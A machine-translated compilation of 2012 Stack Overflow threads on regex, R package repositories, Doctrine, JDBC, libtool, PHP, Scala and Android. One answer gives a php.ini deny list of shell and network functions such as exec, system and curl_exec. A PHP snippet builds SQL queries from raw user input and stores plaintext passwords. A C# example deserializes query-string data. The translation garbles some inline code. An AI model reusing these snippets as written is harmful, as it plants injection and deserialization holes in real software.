> 时间：2012-08-27T21:52:51.677

您可能可以使用正则表达式来做到这一点；像这样的东西：

```
([^[]*)(\[[^]]+\]) 
```

它描述了两个“匹配组”；第一个表示任何零个或多个不是“[”的字符的字符串，第二个表示任何以“[”开头的字符串，包含一个或多个不是“]”的字符，并以“ ]”。

然后您可以扫描您的输入以查找与该模式匹配的内容。第一个匹配组不变通过，第二个匹配组转换为链接。当模式停止匹配您的输入时，取出剩下的任何内容并保持原样传输。

您必须进行一些实验；正则表达式通常需要一些调试。如果您的链接文本只能包含字母数字和空格，则您的模式看起来更像这样：

```
([^[]*)(\[[\s\w]+\]) 
```

另外，你可能会发现Android下的正则表达式匹配太慢了，不实用，这种情况下你就不得不使用wasyl的建议了。

# r - 是否有任何 R 包存储库管理工具？

> ID：12146925
> 
> 赞同：17
> 
> 时间：2012-08-27T17:49:43.867
> 
> 标签：r, repository, package, cran

我正在创建一个自定义 R 包存储库，并希望复制 CRAN 存档结构，从而将旧版本的包存储在`src/contrib/Archive/packageName/`目录中。我想使用(source [here](https://github.com/hadley/devtools/blob/master/R/install-version.r)`install_version` ) 中的函数，但该函数依赖于具有类似 CRAN 的存档结构，而不是在.`devtools``src/contrib/`

是否有任何 R 包存储库管理工具有助于创建此目录结构和其他相关任务（例如更新 Archive.rds 文件）？

如果管理工具`type`在存储库端处理包逻辑，这样我就可以在 Linux 服务器上使用与本地 Mac 上相同的代码`install.packages()`或`install_version()`代码（即，我不必使用`type="both"`或`type="source"`在本地安装时使用苹果电脑）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T20:41:33.923

**简短的回答：** 不是真正的现成使用。

**长答案：** 有几个工具可以用来管理他们的回购，但还没有一个连贯的现成生态系统。

CRAN 维护人员在此处保留了一组脚本[来](http://developer.r-project.org/CRAN/QA/)管理 CRAN 存储库，但尚不清楚它们如何协同工作，或者需要哪些部分来更新包索引、运行包检查或管理目录结构。

该`tools::write_PACKAGES`函数可用于更新包索引，但每次从存储库中添加、更新或删除包时都需要更新此功能。

M.eik Michalke 创建了`roxyPackage` [包](http://reaktanz.de/?c=hacking&s=roxyPackage)，它能够自动更新给定的存储库、安装它等。开发人员最近还添加了使用该功能使存档结构模仿 CRAN 的`archive_structure`功能。缺点是该软件包不在 CRAN 上，如果与`devtools`. 它也是全新的，尚未准备好广泛使用。

最后，我创建了一个小型 Rub​​y[脚本](https://github.com/eshilts/r-repo-updater)，用于监视给定存储库并在任何文件更改时更新包索引。但是，这适用于我的特定组织，需要重构以供外部使用。如果有人对此感兴趣，我可以使其更笼统。

# objective-c - 根据日期管理事件，XCODE

> ID：12146928
> 
> 赞同：0
> 
> 时间：2012-08-27T17:50:15.547
> 
> 标签：objective-c, xcode, ios5

我有一个问题（我只有几个月的时间在 iOS 和 Objective-C 上工作）

在我的应用程序中，我打开了一根蜡烛（png 图像数组），但是这根蜡烛必须保持开启三天，第一天完成，第二个在中间，第三个完全融化。

我不知道该怎么做……有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:53:33.017

您可以只存储点燃蜡烛的日期，[`NSUserDefaults`](http://developer.apple.com/library/ios/documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/Reference/Reference.html)并在应用程序启动时根据该日期更新图形。

还有一个关于日期数学的非常好的 WWDC 视频。

您还可以查看 NSCalendar [https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSCalendar_Class/Reference/NSCalendar.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSCalendar_Class/Reference/NSCalendar.html)

文档。和最重要的 nsdatecomponents 文档：

[https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDateComponents_Class/Reference/Reference.html#//apple_ref/doc/c_ref/NSDateComponents](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDateComponents_Class/Reference/Reference.html#//apple_ref/doc/c_ref/NSDateComponents)

# symfony - 如何使用 Doctrine Annotations 更改实体子类中的列名？

> ID：12146929
> 
> 赞同：3
> 
> 时间：2012-08-27T17:50:16.887
> 
> 标签：symfony, doctrine-orm, fosuserbundle

我将 FOSUserBundle 与一个必须与现有模式一起使用的新 Symfony 项目一起使用。我的用户实体按照说明扩展了 FOS\UserBundle\Entity\User，但电子邮件列被命名为“email_addr”而不是“email”。由于父级定义了 $email 我不能重新声明它来附加我的注释。

```
 /**
  * @var string $emailAddr
  *
  * @ORM\Column(name="email_addr", type="text", nullable=false)
  */
 protected $email; 
```

我得到的例外是：

```
[Doctrine\ORM\Mapping\MappingException]                                                                                
Property "email" in "Foo\DataBundle\Entity\User" was already declared, but it must be declared only once 
```

我的问题是：

*   Doctrine2 子类如何使用注释来更改父类中定义的内容？
*   或者如何覆盖 FOSUserBundle 中的列名？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T18:08:05.523

我找到了答案：

[更多关于 Doctrine 实现的信息](https://github.com/FriendsOfSymfony/FOSUserBundle/blob/master/Resources/doc/doctrine.md#replacing-the-mapping-of-the-bundle)

> 如果您需要更改映射（例如将字段名称调整为旧数据库），唯一的解决方案是再次编写整个映射，而不从映射的超类继承映射。在这种情况下，您的实体应直接从 FOS\UserBundle\Model\User （以及组的 FOS\UserBundle\Model\Group）扩展。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-12T04:34:12.020

看起来学说 2.3 添加了这些功能。不幸的是，SO 决定我必须复制他们网站上已经存在的信息，以避免“琐碎的答案”。

[新 Doctrine 2.3 中的 @AssociationOverride 和 @AttributeOverride](https://stackoverflow.com/questions/12420457/associationoverride-and-attributeoverride-in-new-doctrine-2-3)

# asp.net - Asp.NET 包括、母版页或从单独项目返回方法的某种方式

> ID：12146931
> 
> 赞同：1
> 
> 时间：2012-08-27T17:50:29.843
> 
> 标签：asp.net, coldfusion, master-pages

我以前从未使用过母版页，只完成了几个大型 MVC 3 项目和许多 Asp.NET“网站”电子邮件表单。我想要做的是将 ColdFusion 中的应用程序转换为 ASP.NET。我有 20 个独立的子站点，它们都从一个公共数据库中提取人们的信息。在 ColdFusion 中，我只是让这 20 个页面中的每一页设置一个变量，然后包含一个主 ColdFusion 文件，该文件采用该变量并显示适当的人员列表。

在 ASP.NET 中，我不能包含。我没有使用 WebForms，所以 #include 不在窗口中。我已阅读有关使用母版页的信息，但我可以跨项目使用它们吗？我正在可视化创建一个“主”项目，该项目基于输入变量获取数据，然后是 20 个简单、非常轻量级（但完全独立）的页面，其中包含/显示来自主项目的信息。我不想为此创建 20 个项目，每个项目都包含一个公共库，因为这意味着如果我需要更新某些内容，我必须发布所有 10 个项目，这是我想避免的。

如果不进行 Web 窗体项目和#include .aspx 文件，这是否可行？我现在的文件布局是主项目在 /sites/masterproject 和子站点就像 /sites/site1/directory，/sites/site2/directory，所以这就是为什么我认为这需要是单独的，希望是一个包含包含而不是 20 个单独项目的简单页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:04:54.073

尝试这个：

```
<!-- #include file ="mypage.cshtml " --> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:09:00.123

在 .aspx 页面中，您可以使用 @Page 指令中的 MasterPageFile 属性来指定母版页路径。

因此，使用 VS2008 中的默认项目模板，您的页面中会出现如下内容：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="WebApplication1._Default" MasterPageFile="../../masterproject/site.master" %> 
```

（只需指定正确的相对路径，绝对路径也可能会完成这项工作）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:15:54.160

在 .net 中创建相同效果的方法之一是创建并正确使用 Asp.Net 用户控件。[http://msdn.microsoft.com/en-us/library/26db8ysc(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/26db8ysc(v=vs.85).aspx)。它们几乎是 HTML 代码片段，也可以包含 .Net 代码，稍后您可以简单地将其拖放到其他页面中，结果 HTML 将始终相同，或者也可以是动态的。人们使用它的方式与他们在其他技术中使用的方式相同。

祝你好运。

# java - 查询在 SQL*Plus 中有效，但在 JDBC 中失败并出现 ORA-00911 异常

> ID：12146936
> 
> 赞同：0
> 
> 时间：2012-08-27T17:50:46.800
> 
> 标签：java, oracle

我正在尝试使用以下查询跟踪数据库会话期间生成的重做量：

```
SELECT a.name, b.VALUE
  FROM v$statname a, v$mystat b
  WHERE a.statistic# = b.statistic# AND a.name = 'redo size'; 
```

此查询直接在 SQL*Plus 和 Toad 中工作，但我使用 JDBC 得到 ORA-00911 异常，并且我已将其缩小到“statistic#”列名。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T18:45:13.327

列名`statistic#`不是问题。

`;`我敢打赌，您还可以从 Java 程序内部发送终止。

但是`;`当通过 JDBC 执行 SQL 语句时，您可能不包括（至少在 Oracle 和其他一些 DBMS 中不包括）。

从您的 SQL 字符串中删除`;`它应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:53:17.400

把它放在双引号中 - 这应该让你在 Oracle 中调用任何字段

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:57:04.077

打开 JDBC 日志记录，检查您的驱动程序文档以了解如何执行此操作。在 JDBC 日志中，您可以看到在 DB 中准备和执行的实际语句。这消除了错误的一个可能原因。

# jquery - 使用带有 jQ uery JS 的 colorbox 插件在本地工作，但不能从服务器工作

> ID：12146937
> 
> 赞同：0
> 
> 时间：2012-08-27T17:50:49.837
> 
> 标签：jquery, jquery-plugins, colorbox

我知道我看过一些东西，但正如那句话所暗示的那样，我无法弄清楚它是什么。我已经下载了最新的 jquery 和 colorbox 库。我已将此添加到本地 PC 上的工作网页中，我想在其中添加 javascript 弹出窗口并使其运行良好。我将颜色框用于映射区域图像的信息弹出窗口。在本地，一切正常，但是当我将所有部分上传到我的互联网服务器时，所有点击都会被忽略。现在我已经检查了样式表和 Js 库的权限和相对位置，并且都与其余的工作部分匹配。有问题的网页在
[这里。](http://www.sowardssystemsconsulting.com/accounttracker/helppages/detailedview.html) 编程了几个区域“搜索栏”和“添加新”。它们应该可以工作，但不能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:56:34.730

我发现了一些错误，首先，看看我看到了什么（我会在一分钟内发布错误），尝试在谷歌浏览器中打开你的页面，然后按 Ctrl+Shift+J 打开调试控制台。

> **第一个错误**

```
//  Line 27 of detailedview.html
//  Uncaught Syntax Error: Unexpected token ILLEGAL
settings = "width=900, height=320, top=20, left=20, scrollbars=yes, location=no, 
           directories=no, status=no, menubar=no, toolbar=no, resizable=no, dependent=no";
//  2 possible issues here;
    //  1.) Your "string" is on 2 lines, try closing first line and puttin '+ "' on second line
    //  2.) variable not declared, try full rewrite as follows:
var settings = "width=900, height=320, top=20, left=20, scrollbars=yes, location=no, "
    + "directories=no, status=no, menubar=no, toolbar=no, resizable=no, dependent=no"; 
```

> **第二个和第三个错误**

```
//  GET http://www.sowardssystemsconsulting.com/accounttracker/js/jquery-1.8.0.min.js 403 (Forbidden) 
//  GET http://www.sowardssystemsconsulting.com/accounttracker/js/jquery.colorbox.js 403 (Forbidden) 
//  This is a permissions error on your server
//  Try ensuring the folder where your js is has correct access permissions 
//  In filezilla, this may require right clicking the folder and setting the file permissions
//  Or your hosting site may have account manager tools with some kind of "Reset File Permissions" button. 
```

> **最后一个错误**

```
//  Uncaught ReferenceError: $ is not defined 
//  If your fix the 2nd error, then this one will be corrected by default 
```

# c# - ObjectStateFormatter.Serialize 似乎忽略了我的数组:(

> ID：12146945
> 
> 赞同：0
> 
> 时间：2012-08-27T17:51:29.613
> 
> 标签：c#, asp.net-mvc

所以我正在开发一个现有的应用程序，它有一个很好的小助手方法，最终调用 ObjectStateFormatter Serialize() - 这是代码。

```
/// <summary>
/// Transforms a limited object serialization (LOS)-formatted object into a view-state value and places the results into a <see cref="T:System.IO.TextWriter"/> object.
/// </summary>
/// <param name="output">The <see cref="T:System.IO.TextWriter"/> to receive the transformed value. </param><param name="value">The LOS-formatted object to transform into a view-state value. </param>
public void Serialize(TextWriter output, object value)
{
  this.SerializeInternal(output, value);
}

private void SerializeInternal(TextWriter output, object value)
{
  string str = this._formatter.Serialize(value);
  output.Write(str);
} 
```

我是否正确地假设它忽略了我的 List 属性？

谢谢肯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T02:10:20.787

如果有人想知道 - LosFormatter 确实会序列化一个通用列表。我只是做了一个小测试。这当然让我弄清楚我刚刚继承的架构中的哪个地方失败了，但至少我知道它会起作用。这是我放在一起的示例。

```
public ActionResult Index()
{
    ViewData["Message"] = "Welcome to ASP.NET MVC!";
    var Person = new Person
                     {
                         FirstName = "Ken",
                         LastName = "N",
                         Phones = new List<Phone>
                                      {
                                          new Phone {Ext = "O", PhoneNumber = "2341234"},
                                          new Phone {Ext = "O", PhoneNumber = "2341234"},
                                          new Phone {Ext = "O", PhoneNumber = "2341234"}
                                      }
                     };
    var serializedPersonObject = LosSerializeObject(Person);
    ViewData["PersonObject"] = serializedPersonObject;
    return View();
}

public ActionResult About()
{
    var personString = Request.QueryString[0];
    var person = (Person) RetrieveObjectFromViewState(personString);
    return View();
}

string LosSerializeObject(object obj)
{
    var los = new System.Web.UI.LosFormatter();
    var writer = new StringWriter();
    los.Serialize(writer, obj);
    return writer.ToString();
}

object RetrieveObjectFromViewState(string serializedObject)
{
    var los = new System.Web.UI.LosFormatter();
    return los.Deserialize(serializedObject);
} 
```

然后是 Index.ASPX 页面上的一个按钮

```
<%= Html.ActionLink("Check this", "About", "Home", new { person = ViewData["PersonObject"] }, null)%> 
```

果然，对序列化和反序列化的调用给了我电话列表。

# database - 在 Pig 中，查找表中条目的补充

> ID：12146948
> 
> 赞同：2
> 
> 时间：2012-08-27T17:51:36.507
> 
> 标签：database, apache-pig

我有一个`A`包含列表的表，该表`B`包含`A`. 应该如何获得一个`C`包含列表的表，该列表是`B`in的补集`A`？

我知道如何在sql中做到这一点。我不确定如何在 Pig 中处理它。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T10:00:40.503

用 PIG 的话来说，你有两个“包”A 和 B，其中 B 是 A 的子集。

如果 B 仅包含 A 中的值，则可以执行 C = DIFF(A,B)。但是，考虑到 DIFF 会删除重复项，因此您将 A 中 B 的补码减少为唯一值。

通常，DIFF 提供 A 中 B 的补码和 B 中 A 的补码的并集。

# build - XI.: 找不到命令，并且无法构建某种软件，这是怎么回事？

> ID：12146950
> 
> 赞同：3
> 
> 时间：2012-08-27T17:51:45.200
> 
> 标签：build, autotools, autoconf, automake, libtool

错误信息如下：

```
./libtool: line 1129: X-I.: command not found
./libtool: line 1129: X-DLT_CONFIG_H=<config.h>: command not found
./libtool: line 1129: X-DLTDL: command not found
./libtool: line 1129: X-I.: command not found
./libtool: line 1129: X-I.: command not found
./libtool: line 1129: X-Ilibltdl: command not found
./libtool: line 1129: X-I./libltdl: No such file or directory
./libtool: line 1129: X-I./libltdl: No such file or directory
./libtool: line 1129: X-g: command not found
./libtool: line 1129: X-O2: command not found
./libtool: line 1129: X-MT: command not found
./libtool: line 1129: Xdlopen.lo: command not found
./libtool: line 1129: X-MD: command not found
./libtool: line 1129: X-MP: command not found
./libtool: line 1129: X-MF: command not found
./libtool: line 1129: X.deps/dlopen.Tpo: No such file or directory
./libtool: line 1129: X-c: command not found
./libtool: line 1181: Xdlopen.lo: command not found
./libtool: line 1186: libtool: compile: cannot determine name of library object from `': command not found
make[2]: *** [dlopen.lo] Error 1
make[2]: Leaving directory `/home/mirror/tmp/tmp/3/libltdl'
make[1]: *** [all] Error 2
make[1]: Leaving directory `/home/mirror/tmp/tmp/3/libltdl'
make: *** [lib] Error 2 
```

真是令人困惑，系统上无论如何都没有 XI 命令，有人说这是一种 libtool 错误，如果我将 $echo 替换为 $ECHO，构建将是好的:(

令人难以置信的是，在我将 $echo 替换为 $ECHO 后，运行 make lib，然后 libtool 将恢复，并且所有 $ECHO 将再次成为 $echo，并且构建失败并出现相同的错误....

那么如何构建这个包而不出错呢？有什么建议么？

包名称是skyeye，它是一种模拟器，你可以在上面运行多种嵌入式系统：）你可以从这里获取源代码

```
git://skyeye.git.sourceforge.net/gitroot/skyeye/skyeye 
```

构建教程在这里：

[http://skyeye.sourceforge.net/wiki/index.php/SkyEye_User_Manual#1.2_Installation](http://skyeye.sourceforge.net/wiki/index.php/SkyEye_User_Manual#1.2_Installation)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-05-27T08:49:55.760

最近我遇到了同样的问题。

这是脚本 libtool 中的一个错误，它试图像有程序一样执行参数（以 X 为前缀），除非定义了变量 $echo。

要修复它，请在此之前执行此操作：

```
export echo=echo 
```

然后再试一次。

在这里找到：我在这个线程中找到了解决方案：[http ://www.wreckedgames.com/forum/index.php?topic=1135.0](http://www.wreckedgames.com/forum/index.php?topic=1135.0)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T08:51:01.893

听起来像是用于在期间进行检查的 Libtool 宏的版本与用于构建`configure`的文件不匹配。`ltmain.sh``libtool`

我会简单地更新`libtool`到最新版本并`libtoolize -f`手动运行以确保一切都是最新的。

# c# - ASP.Net AJAX 调用 c# 函数

> ID：12146951
> 
> 赞同：1
> 
> 时间：2012-08-27T17:51:47.603
> 
> 标签：c#, asp.net, web

最近几天一直在四处寻找，试图找出最好的路线是什么。我对 ASP.Net 还很陌生，所以我需要一点帮助。

我喜欢使用 Master Pages 的想法，因为它可以更轻松地更改模板！但我遇到了一些问题。我将在下面列出它们，看看我们可以去哪里，也许这会帮助像我这样的其他新手。

* * *

动态菜单：我正在尝试创建一个菜单系统，该系统将根据用户角色显示某些链接。这很简单，直到我只想让链接执行一些功能，仅此而已。所以我不希望它回发或任何东西。所以我的下一步是尝试像我的 php 开发一样使用 jQuery。问题是我似乎无法让我的 jQUery 调用函数背后的母版页代码。我已经浏览了所有使用 WebMethods 可以找到的教程，但一直收到类似“不提供此类页面”的错误。

通用类：在 PHP 中，有时我需要一些与应用程序特定区域相关的通用类。我会用这些来保存我可能需要从 jQuery 调用的所有函数。ASP.Net 中有类似的东西吗？我尝试只添加一个类，但再次无法从 jQuery 调用它。这是 Web 服务擅长的事情吗？我仍在尝试了解它们的全部用途。似乎我们可以使用 Web 服务作为客户端和后端类之间的缓冲区。

我期待任何指示或提示！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T12:09:04.903

Oded 和 jrummell 非常清楚我应该先从 ASP.NET MVC 开始。对我来说，从 php 迁移到这里很可能是一条更容易的道路。

# php - 使用 PHP COOKIE

> ID：12146953
> 
> 赞同：-1
> 
> 时间：2012-08-27T17:52:06.700
> 
> 标签：php, mysql

我在用户登录/注册时为他们设置了 COOKIE 和 SESSION。一个 SESSION 用于更多可用性，一个 COOKIE 用于持久性。当新用户注册我的网站时，我想将他们重定向到他们的个人资料。我需要在他们注册后立即创建一个 SESSION 和 COOKIE 变量以执行此操作。这是我的解决方案：

```
 $query2= "INSERT INTO users (fname, lname, email, password) VALUES   
 ('$fname', '$lname', '$email', '$password1')";
    mysqli_query($connect, $query2)
        or die('error with query');
    session_start();
    $query3= "SELECT * FROM users where email= '".$email."' AND password= 
'".$password1."'";
    $result2= mysqli_query($connect, $query3);
    $row= mysqli_fetch_array($result2);
    $_SESSION['id'] = $row['user_id']; 
    setcookie('id', $row['user_id']);
            echo $_SESSION['id'];
            echo $_COOKIE['id'];
    echo "You are now logged in."; 
```

我首先插入新的数据行。然后我记得它来创建 SESSION 和 COOKIE 变量。但是，这是我的问题，每当我回显 COOKIE 变量时，它的值总是比实际值小一。SESSION 还可以。我究竟做错了什么？可能是什么问题呢。我创建了另一个 page.php 来回显 SESSION 和 COOKIE 变量，它们在那里都是正确的。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:57:47.487

您使用 setcookie 设置的 cookie 的值不会显示在同一页面上。

cookie 的工作方式是将您在 cookie 中设置的数据发送到浏览器以将其保存到本地 PC。下次您的浏览器连接到服务器时，浏览器会在 $_COOKIE 数组中将其提供给您的页面。

因此，在设置后立即使用 $_COOKIE 将不起作用。

另一方面，会话可以在使用 $_SESSION 设置后立即使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:56:00.010

`$_COOKIE`包含在请求中发送的 cookie。呼叫`setcookie()`不会改变`$_COOKIE`——直到他们发送下一个请求。您正在看到最后一个请求的 cookie。;)

# scala - 如何获取地图的子集？

> ID：12146954
> 
> 赞同：4
> 
> 时间：2012-08-27T17:52:08.240
> 
> 标签：scala, map

如何获取地图的子集？

假设我们有

```
val m: Map[Int, String] = ...
val k: List[Int] 
```

其中所有键都`k`存在于`m`.

现在我想获得 Map 的一个子部分，`m`其中只有 key 在 list 中的对`k`。

类似的东西`m.intersect(k)`，但`intersect`没有在地图上定义。

一种方法是使用`filterKeys`: `m.filterKeys(k.contains)`。但这可能有点慢，因为对于原始映射中的每个键，都必须在列表中进行搜索。

我能想到的另一种方法是`k.map(l => (l, m(l)).toMap`。这里只是遍历我们真正感兴趣的键而不进行搜索。

有更好的（内置）方式吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-27T18:09:09.063

```
m filterKeys k.toSet 
```

因为 a`Set`是`Function`.

**关于性能**： `filterKeys`它本身是 O(1)，因为它通过生成一个新的地图来工作，其中覆盖了、`foreach`和方法。访问元素时会产生开销。这意味着新地图不使用额外的内存，但也无法释放旧地图的内存。`iterator``contains``get`

如果您需要释放内存并尽可能快地访问，一种快速的方法是将 的元素折叠`k`到一个新的 Map 中而不产生中间`List[(Int,String)]`：

```
k.foldLeft(Map[Int,String]()){ (acc, x) => acc + (x -> m(x)) } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-28T06:56:13.553

`val s = Map(k.map(x => (x, m(x))): _*)`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T15:38:41.617

我认为这是最具可读性和表现最好的：

`k zip (k map m) toMap`

或者，方法调用样式将是：

`k.zip(k.map(m)).toMap`

# php - 安全地为其他人的 PHP 服务

> ID：12146959
> 
> 赞同：1
> 
> 时间：2012-08-27T17:52:32.787
> 
> 标签：php, linux, apache, security, amazon-ec2

我有一个 Amazon ec2 实例 (linux)。

我希望您（是的，您）能够上传 PHP 文件，然后在 www.mydomain.com/yourname 上实时提供它。我也希望能够为许多其他人（www.mydomain.com/theirname）做到这一点。

我担心你（或者他们，我们不要指手画脚）会做恶意的事情（有意或无意地）。例如，无限循环、在根目录之外读取/写入、关闭服务器、运行系统命令等。如果我想成为恶意软件，我会尝试这样做。

有没有办法设置 PHP/apache/user 权限，或者在提供代码之前搜索他们的代码，这样恶意至少会变得更加困难？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-27T17:55:07.597

除其他外，您肯定需要调整 PHP.ini 以包含以下内容：

```
disable_functions =exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source 
```

这将阻止在使用此 .ini 的任何 PHP 文件中执行这些函数

我还将启用[open_basedir](http://www.php.net/manual/en/ini.core.php#ini.open-basedir)支持以将用户锁定在他们自己的目录中，这样他们就不能使用类似的东西：

`require_once '../../another_user/index.php';`

或者

`$notMyFile = file_get_contents('../../another_user/config.php');`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-27T17:55:52.730

没有万无一失的方法可以做到这一点。

首先，没有系统调用。

其次，每个脚本的超时。

而且，您可能还想在手中保留一个外部的“退出按钮”，以便在发现问题时可以拔掉插头。

PHP 是一种非常庞大的语言，让其他人在您的服务器上运行代码是一件*很难*安全的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:56:19.027

看看 Runkit 沙盒

> 实例化 Runkit_Sandbox 类会创建一个具有自己的范围和程序堆栈的新线程。使用传递给构造函数的一组选项，此环境可能会被限制为主要解释器可以执行的操作的子集，并为执行用户提供的代码提供更安全的环境。

[http://php.net/manual/en/runkit.sandbox.php](http://php.net/manual/en/runkit.sandbox.php)

请记住，您提供给沙盒环境的任何资源都可能并且最终会被滥用。例如，如果用户不应该能够影响彼此的结果，并且您确实为用户提供了一个数据库，那么在他们的沙箱中为每个用户提供一个具有不同凭据的不同数据库。

# php - 将 id 属性添加到上一个下一个链接

> ID：12146960
> 
> 赞同：2
> 
> 时间：2012-08-27T17:52:43.513
> 
> 标签：php, wordpress

我想知道如何将 id 属性添加到由`previous_posts_link()`和`next_posts_link()` 函数生成的链接。我发现我可以使用以下代码添加类：

```
add_filter('next_posts_link_attributes', 'posts_link_attributes');
add_filter('previous_posts_link_attributes', 'posts_link_attributes');

function posts_link_attributes() {
    return 'class="styled-button"';
} 
```

但是如何处理`id`属性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T18:05:45.637

我相信你可以简单地使用多个过滤器来处理这个：

```
add_filter('next_posts_link_attributes', 'set_next_id');
add_filter('previous_posts_link_attributes', 'set_previous_id');

function set_next_id() {
    return 'id="next"';
}

function set_previous_id() {
    return 'id="previous"';
} 
```

# windows - 在具有标准 VGA 图形的机器上模拟 OpenGL

> ID：12146963
> 
> 赞同：3
> 
> 时间：2012-08-27T17:53:01.340
> 
> 标签：windows, opengl, emulation, video-card

所以，我们有一个小图形小窍门，需要在没有真正视频卡的服务器环境中运行。它真正需要的只是帧缓冲区对象，也许还有一些矢量/字体抗锯齿。这会很慢，我知道。它只需要输出单帧。

我看到[这篇](https://stackoverflow.com/questions/7364871/how-to-start-opengl-in-software-emulation-mode)关于如何强制软件渲染模式的帖子，但它似乎适用于已经启用了 OpenGL 的卡（如 NVidia）的机器。

所以，因为害怕尝试在三个时区之外的机器上安装 OpenGL，并且上面有一堆现场生产站点——有没有人尝试过这个和/或知道如何“模拟”OpenGL 环境？不幸的是，我们的开发服务器有一个视频卡，所以我不能真正展示“我试过的东西”。

相关代码都在 Cinder 中，但我认为我们实际的 OpenGL 使用是轻量级的。

这将在 windows server 2008 Standard 上运行

我看到 MS 有一个适用于 OGL 1.1 的[软件实现](http://msdn.microsoft.com/en-us/library/windows/desktop/dd374278%28v=vs.85%29.aspx)，但似乎找不到适用于 2.0的软件实现

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T18:03:56.953

[构建](https://stackoverflow.com/a/17917331/44729)/查找一些[Mesa](http://www.mesa3d.org/) DLL。

它会很慢。

# android - 如何使长 TextView 的一部分在屏幕上可见？

> ID：12146967
> 
> 赞同：3
> 
> 时间：2012-08-27T17:53:17.820
> 
> 标签：android, textview

我在 ScrollView 中有一个 TextView，TextView 充满了一个大文本，随时只有部分文本在屏幕上可见。现在我想（以编程方式）强制文本的某些部分对用户可见。例如，我的文字是：

*Lorem ipsum dolor sit amet, consectetur adipiscing elit。Ut id ante Tellus。Nulla facilisi。Sed gravida fringilla velit，非 sollicitudin Tellus egestas 非。Cras congue, nulla id bibendum tempus, dui dui blandit elit, elementum dictum dolor eros et mi。Nullam leo tellus, aliquet vel tincidunt sed, suscipit nec dui。Nunc dapibus, odio vestibulum hendrerit vestibulum, lorem orci dictum arcu, quis porttitor lorem libero sit amet odio。Sed imperdiet viverra diam, eu porttitor ipsum fringilla 等。Suspendisse consectetur sapien ac felis tincidunt dictum。Suspendisse ultrices porta dignissim。Maecenas in nibh sed nisi facilisis dignissim non ut **tortor**. Pellentesque eleifend tempus sem，sit amet mattis arcu auctor id。Vivamus 在 tortor rutrum diam 前庭 adipiscing。暂停潜力。整数 sollicitudin laoreet enim ac suscipit。Quisque convallis facilisis pharetra。*

我想强制用户看到粗体字（**在**这个例子中是**tortor** ） （也许通过使用正确的值垂直滚动 textview）。有没有办法做到这一点？

 **编辑：我不想让这个词加粗！更新了问题以澄清我的要求。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:21:20.213

这将是一个相当大的努力，但使用`android.graphics.Paint#measureText(...)`resp。`breakText(...)`应该可以计算出您必须如何滚动才能使所需的单词可见。您必须考虑字体、字体大小、显示文本的视图大小等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T18:53:15.750

这是滚动到特定单词的一种方法：

```
public void scrollToWord(String string) {
    TextView textView = (TextView) findViewById(R.id.text1);
    String text = textView.getText().toString();

    // Find the first occurrence of the word 
    int position = text.indexOf(string);
    // Calculate how far in the word is: 30%, 40%, 73% 
    int percent = (int) (position / (double) text.length() * 100);
    // Calculate how far to scroll
    int y = textView.getHeight() * percent;

    // Finally scroll
    ((ScrollView) textView.getParent()).scrollTo(0, y);
} 
```

我对此有两点说明：

1.  这只会滚动到第一次出现，但很容易更改`String.indexOf(string, start)`并找到第二次、第三次等。

2.  如果您想在应用程序启动后立即滚动到此位置，则必须等到 onResume() 完成后。但是没有办法解决这个问题......我建议使用处理程序，如果您需要它，我可以帮助您。

希望有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:13:18.433

您可以使用带有粗体选项的 html 标记来使该特定单词变为粗体。**

# android - 上传图片到 Facebook 相册，必须接受每张图片

> ID：12146971
> 
> 赞同：1
> 
> 时间：2012-08-27T17:53:30.283
> 
> 标签：android, facebook

当我将图像上传到我的 Facebook 相册时，一切正常，并且图像会自动发布到时间轴上。但是，现在当我上传图片时，我需要去相册并接受图片。我得到以下信息

```
"Photos below are uploaded by another application, so you must accept them." 
```

我不知道它为什么停止工作，就像应用程序忘记了我的权限一样。我试图从 android 和 Facebook 页面中删除该应用程序。似乎没有任何效果。我正在使用以下权限。

```
facebook.authorize(this, new String[] { "email", "user_photos", "publish_checkins",
                "publish_stream", "publish_actions" }, 
```

